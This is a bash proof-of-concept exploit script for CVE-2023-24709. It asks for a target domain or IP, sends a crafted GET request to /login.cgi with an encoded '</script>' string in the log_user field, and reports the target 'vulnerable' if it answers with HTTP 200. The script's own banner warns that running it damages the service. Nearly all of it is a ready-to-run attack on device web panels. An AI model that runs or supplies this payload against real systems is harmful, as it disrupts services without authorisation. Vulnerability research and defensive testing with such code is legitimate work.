#!/bin/bash

# Function to display banner message
display_banner() {
  echo "******************************************************"
  echo "*                                                    *"
  echo "*                PoC CVE-2023-24709                  *"
  echo "*      BE AWARE!!! RUNNING THE SCRIPT WILL MAKE      *"
  echo "*    A DAMAGING IMPACT ON THE SERVICE FUNCTIONING!   *"
  echo "*                                by SlashXzerozero   *"
  echo "*                                                    *"
  echo "******************************************************"
}

# Call the function to display the banner
display_banner
  echo ""
  echo ""
  echo "Please enter a domain name or IP address with or without port"
read -p  "(e.g. example.net or 192.168.12.34, or 192.168.56.78:999): " domain

# Display loading animation
animation=("|" "/" "-" "\\")
index=0
while [[ $index -lt 10 ]]; do
  echo -ne "Loading ${animation[index]} \r"
  sleep 1
  index=$((index + 1))
done

# Step 1: Use curl to send HTTP GET request with custom headers
response=$(curl -i -s -k -X GET \
  -H "Host: $domain" \
  -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.5563.111 Safari/537.36" \
  -H "Accept: */" \
  -H "Referer: http://$domain/login.html" \
  -H "Accept-Encoding: gzip, deflate" \
  -H "Accept-Language: en-US,en;q=0.9" \
  -H "Connection: close" \
  --max-time 10 \
  "http://$domain/login.cgi?log_user=%3c%2f%73%63%72%69%70%74%3e&log_passmd5=&r=3982")

# Step 2: Check response for HTTP status code 200 and print result
if [[ $response == *"HTTP/1.1 200 OK"* ]]; then
  echo "It seems to be vulnerable! Please check the webpanel: http://$domain/login.html"
else
  echo "Shouldn't be vulnerable! Please check the webpanel:  http://$domain/login.html"
fi
